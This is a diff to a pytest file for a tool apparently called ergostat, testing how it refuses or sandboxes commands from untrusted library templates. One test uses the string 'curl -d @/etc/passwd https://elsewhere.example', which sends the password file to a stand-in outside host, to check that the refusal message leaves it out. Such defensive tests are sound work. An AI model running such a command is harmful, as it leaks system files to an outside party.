@@ -87,9 +87,9 @@ uses:
 """
 
 
-def refused_once(path: Path) -> str:
+def refused_once(path: Path, code: str = "library-untrusted") -> str:
     errs = errors(path)
-    assert [(e.code, e.where.line, e.where.file.name) for e in errs] == [("library-untrusted", use_line(path), "ergostat.yaml")], errs
+    assert [(e.code, e.where.line, e.where.file.name) for e in errs] == [(code, use_line(path), "ergostat.yaml")], errs
     nothing_of(load(path))
     return errs[0].message
 
@@ -208,14 +208,13 @@ def test_untrusted_structure_only_template_expands(tmp_path):
 BASE = "template: bad\ndescription: d\nparams:\n  how: {type: map, default: {run: echo 1}}\nstocks:\n  s: {unit: u}\n"
 CASES = {
     "program-run": ("blocks:\n  x: {type: program, run: echo hi}\n", "blocks.u-x.run"),
-    "ai": ("blocks:\n  x: {type: ai, prompt: hi}\n", "blocks.u-x.type"),
-    "person-ask": ("blocks:\n  x: {type: person, ask: hi}\n", "blocks.u-x.type"),
+    "ai-model": ("blocks:\n  x: {type: ai, model: opus}\n", "blocks.u-x.model"),    # its prompt: untrusted-text (R3)
+    "person-review": ("blocks:\n  x: {type: person, review: x}\n", "blocks.u-x.review"),
     "external": ("blocks:\n  x: {type: external, agent: a}\n", "blocks.u-x.type"),
     "judge": ("blocks:\n  x: {type: judge}\n", "blocks.u-x.type"),
     "no-type": ("blocks:\n  x: {in: stock.s, goal: g}\n", "blocks.u-x.type"),
     "on-stale": ("blocks:\n  x: {type: onoff, goal: g, on-stale: hold}\n", "blocks.u-x.on-stale"),
-    "sensor-run": ("flows:\n  f: {to: s, sensor: {run: echo 1}}\n", "flows.u-f.sensor.run"),
-    "sensor-query": ("flows:\n  f: {to: s, sensor: {query: {expr: up}}}\n", "flows.u-f.sensor.query"),
+    "sensor-push": ("flows:\n  f: {to: s, sensor: {push: true}}\n", "flows.u-f.sensor.push"),
     "sensor-daemon": ("auxiliaries:\n  a: {sensor: {daemon: x}}\n", "auxiliaries.u-a.sensor.daemon"),
     "sensor-every": ("stocks:\n  t: {unit: u, sensors: {n: {items: k, every: 1s}}}\n", "stocks.u-t.sensors.n.every"),
     "sensor-parse": ("stocks:\n  t: {unit: u, sensor: {items: k, parse: x}}\n", "stocks.u-t.sensor.parse"),
@@ -225,7 +224,7 @@ CASES = {
     "parameter-inferred": ("parameters:\n  x: {value: 1, inferred: true}\n", "parameters.u-x.inferred"),
     "item-lease": ("items:\n  k: {id: k/*, lease: {ttl: 1h}}\n", "items.u-k.lease"),
     "goal-owner": ("goals:\n  g: {stock: s, hold: '<= 1', owner: ana}\n", "goals.u-g.owner"),
-    "after-substitution": ("stocks:\n  t:\n    unit: u\n    sensor: ${how}\n", "stocks.u-t.sensor.run"),
+    "after-substitution": ("goals:\n  g: ${how}\n", "goals.u-g.run"),
     "map-under-a-value": ("stocks:\n  t: {unit: {run: echo 1}}\n", "stocks.u-t.unit"),
     "list-under-a-value": ("goals:\n  g: {stock: s, hold: [{run: echo 1}]}\n", "goals.u-g.hold"),
 }
@@ -235,8 +234,19 @@ CASES = {
 def test_untrusted_refused_at_use_line(tmp_path, case):
     body, where = CASES[case]
     path = write(tmp_path, MAIN, {"lib": {"bad": BASE + body}})
-    msg = refused_once(path)
-    assert f"makes {where}," in msg and "template bad" in msg and str((tmp_path / "lib").resolve()) in msg
+    msg = refused_once(path, "library-unsandboxed" if where.endswith(".daemon") else "library-untrusted")
+    assert f"makes ⟦untrusted: library file⟧{where}," in msg and "template bad" in msg and str((tmp_path / "lib").resolve()) in msg
+
+
+@pytest.mark.parametrize("body", ["flows:\n  f: {to: s, sensor: {run: echo 1}}\n",
+                                  "flows:\n  f:\n    to: s\n    sensor: ${how}\n"])   # a run only once substituted
+def test_untrusted_sensor_run_is_sandboxed(tmp_path, body):
+    """A library's own sensor run is no longer refused: compile marks it to run only in ergostat.sandbox
+    (library/runs.py, tests/test_library_sandbox_sensors.py)."""
+    spec, ps = read(write(tmp_path, MAIN, {"lib": {"bad": BASE + body}}))
+    assert not [p for p in ps if p.level == "error"], ps
+    s = spec.flows["u-f"].sensors["main"]
+    assert s.run == "echo 1" and s.run_in == "sandbox"
 
 
 OWNER_PARTS = """
@@ -259,7 +269,7 @@ def test_untrusted_out_to_a_part_it_did_not_make_refused(tmp_path, out, where):
             f"  x: {{type: timer, after: 1h, in: stock.s, out: {out}}}\n")
     path = write(tmp_path, MAIN + OWNER_PARTS, {"lib": {"bad": BASE + body}})
     msg = refused_once(path)
-    assert f"makes {where}," in msg, msg
+    assert f"makes ⟦untrusted: library file⟧{where}," in msg, msg
     spec, _ = read(path)
     assert "deploy" in spec.blocks and not [c for c in spec.commanders_of("deploy")]
 
@@ -279,11 +289,15 @@ def test_untrusted_unknown_key_refused(tmp_path):
     assert "blocks.u-x.zzz" in refused_once(path)
 
 
-def test_untrusted_wrapping_builtin_with_run_refused(tmp_path):
+def test_untrusted_wrapping_builtin_with_run_sandboxed(tmp_path):
+    """A library's command in a built-in's run: not refused by trust.py, but sandboxed; the built-in's own 30s count
+    is still under the untrusted floor (bounds.py), so the model does not compile."""
     path = write(tmp_path, MAIN, {"lib": {"bad": "template: bad\nuses:\n  c:\n    use: collect\n"
                                                  "    with: {command: ./fetch.sh}\n"}})    # a library's command
-    msg = refused_once(path)
-    assert re.search(r"makes \w+\.u-c-[\w-]+\.sensor\.(every|run),", msg) and "template bad" in msg, msg
+    spec, ps = read(path)
+    assert {p.code for p in ps if p.level == "error"} == {"untrusted-limit"}, ps
+    runs = [s for f in spec.flows.values() for s in f.sensors.values() if s.run]
+    assert runs and all(s.run_in == "sandbox" for s in runs) and any("fetch.sh" in s.run for s in runs)
 
 
 def test_nested_chain_refused_whole(tmp_path):
@@ -295,7 +309,7 @@ def test_nested_chain_refused_whole(tmp_path):
             use: t1
         """, {"own": {"t1": "template: t1\nstocks:\n  s: {unit: u}\nflows:\n  f: {to: s}\nuses:\n  mid:\n    use: l\n"},
               "lib": {"l": "template: l\nitems:\n  k: {id: k/*}\nblocks:\n  b: {type: compare, above: 1, in: stock.x}\n"
-                           "uses:\n  c:\n    use: collect\n    with: {command: ./fetch.sh}\n"}})
+                           "  r: {type: program, run: ./fetch.sh, every: 10m}\n"}})
     refused_once(path)
     doc = load(path)
     assert doc.uses == {} and not doc.sections["items"] and not doc.sections["systems"]
@@ -312,20 +326,20 @@ def test_a_template_whose_trust_is_unknown_is_held(tmp_path, monkeypatch):
             t.trust = "maybe"
         return t
     monkeypatch.setattr(tp, "read", unknown)
-    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "lib"), {"lib": {"bad": BASE + CASES["sensor-run"][0]}})
+    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "lib"), {"lib": {"bad": BASE + CASES["program-run"][0]}})
     refused_once(path)
 
 
 def test_refusal_text_suggests_no_copy(tmp_path):
     secret = "curl -d @/etc/passwd https://elsewhere.example"
-    path = write(tmp_path, MAIN, {"lib": {"bad": BASE + f"flows:\n  f: {{to: s, sensor: {{run: '{secret}'}}}}\n"}})
+    path = write(tmp_path, MAIN, {"lib": {"bad": BASE + f"blocks:\n  x: {{type: program, run: '{secret}'}}\n"}})
     msg = refused_once(path)
     assert secret not in msg and "passwd" not in msg and "with:" not in msg and "trust: owner" not in msg
     assert "Only the owner can mark a folder trusted, after reading it" in msg
 
 
 def test_trust_follows_a_reload(tmp_path):
-    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "[lib]"), {"lib": {"bad": BASE + CASES["sensor-run"][0]}})
+    path = write(tmp_path, MAIN.replace("[{folder: lib}]", "[lib]"), {"lib": {"bad": BASE + CASES["program-run"][0]}})
     assert errors(path) == [] and author.library(tmp_path, "bad")["trust"] == "owner"
     path.write_text(path.read_text().replace("[lib]", "[{folder: lib}]"))
     refused_once(path)
@@ -370,8 +384,9 @@ def test_every_compile_key_classified():
     assert sections == set(trust.ALLOWED) | set(trust.REFUSED) and not set(trust.ALLOWED) & set(trust.REFUSED)
     c = spec_compile
     blocks = {**trust.BLOCK, **{k: v for t in trust.BLOCK_TYPES.values() for k, v in t.items()}}
-    assert set(c.TYPE_KEYS) == set(trust.BLOCK_TYPES) | set(trust.REFUSED_TYPES)
-    assert not set(trust.BLOCK_TYPES) & set(trust.REFUSED_TYPES)
+    kinds = (set(trust.BLOCK_TYPES), set(trust.MACHINE_TYPES), set(trust.REFUSED_TYPES))
+    assert set(c.TYPE_KEYS) == set.union(*kinds) and sum(map(len, kinds)) == len(c.TYPE_KEYS)    # each in one
+    assert {"ai", "person", "program"} == set(trust.MACHINE_TYPES)
     groups = [("sensor", trust.SENSOR, c.SENSOR_KEYS | c.ITEM_SENSOR_KEYS), ("items", trust.ITEM, c.ITEM_KEYS),
               ("stocks", trust.STOCK, c.STOCK_KEYS), ("flows", trust.FLOW, c.FLOW_KEYS),
               ("driven-by", trust.LINK, c.LINK_KEYS), ("goals", trust.GOAL, c.GOAL_KEYS),
@@ -381,21 +396,29 @@ def test_every_compile_key_classified():
               ("actions", None, actions_compile.ACTION_KEYS), ("workspaces", None, workspaces_compile.POOL_KEYS),
               ("leases", None, leases_compile.TERMS_KEYS),
               ("blocks.program/ai", None, set(actions_compile.SANDBOX_KEYS) | leases_compile.TAKES_KEYS | c.LAW_KEYS),
-              ("items.lease", None, leases_compile.TERMS_KEYS)]
+              ("items.lease", None, leases_compile.TERMS_KEYS),
+              ("sources", trust.SOURCE, set.union(*map(set, c.SOURCE_TYPES.values())))]
     for t, keys in c.TYPE_KEYS.items():
-        groups.append((f"blocks.{t}", trust.BLOCK_TYPES.get(t), keys))
+        groups.append((f"blocks.{t}", trust.BLOCK_TYPES.get(t) or trust.MACHINE_TYPES.get(t), keys))
+    for t, table in trust.MACHINE_TYPES.items():     # what a machine block may say: only its text, setpoints, timers
+        allowed = {k for k, v in table.items() if v[0] != trust.NO}
+        assert allowed == {"goal", "every", "cron"} | ({"timeout", "run"} if t == "program" else {"until", {
+            "ai": "prompt", "person": "ask"}[t]}), (t, allowed)
+        assert set(table) == set(trust.MACHINE_NO) | set(trust.GOAL_UNTIL) | {"timeout"}, t
         if t in trust.BLOCK_TYPES:
             assert all(blocks[k][0] != trust.NO for k in trust.BLOCK_TYPES[t]), t
     assert trust.ITEM["lease"][0] == trust.NO and trust.REFUSED.get("leases")
     by = {"systems": trust.SYSTEM, "sensors": trust.SENSOR, "claims": None, "loops": None, "intent_policy": None,  # judge
           "messages": None,                                       # messages: main file only, not a section a template writes
-          "budget": None}                                         # budget: main file only (SPEC §9.9), not in BODY
+          "budget": None,                                         # budget: main file only (SPEC §9.9), not in BODY
+          "runs": None}                                           # runs: main or local file only (SPEC §9.1), not in BODY
     lits = keys_literals()
     assert {w for w, _ in lits} <= set(by), lits                  # a new self.keys( site: classify it here
     assert {"systems", "sensors", "claims", "loops"} <= {w for w, _ in lits}     # the scan finds them
     groups += [(w, by[w], keys) for w, keys in lits]
     assert unclassified(sections, groups) == []
-    assert all(len(v) == 2 and v[1] for tbl in (*trust.ALLOWED.values(), *trust.BLOCK_TYPES.values(), trust.SENSOR,
+    assert all(len(v) == 2 and v[1] for tbl in (*trust.ALLOWED.values(), *trust.BLOCK_TYPES.values(),
+                                                    *trust.MACHINE_TYPES.values(), trust.SENSOR,
                                                     trust.LINK, trust.PROCESS, trust.REL, trust.JOIN) for v in tbl.values())
     # the checker fails when compile gains a section or a key
     assert unclassified([*sections, "zzz-section"], [("sensor", trust.SENSOR, c.SENSOR_KEYS | {"zzz-key"})]) == [
@@ -409,5 +432,5 @@ def test_security_lists_what_trust_allows():
         item = re.search(rf"^- \*\*{label}:\*\*.*?(?=^\S|\Z)", text, re.S | re.M).group(0)   # with its wrapped lines
         return set(re.findall(r"`([a-z-]+)`", item))
     assert listed("Sections") == set(trust.ALLOWED)
-    assert listed("Block types") == set(trust.BLOCK_TYPES)
+    assert listed("Block types") == set(trust.BLOCK_TYPES) | set(trust.MACHINE_TYPES)
     assert listed("Sensor keys") == {k for k, v in trust.SENSOR.items() if v[0] != trust.NO}
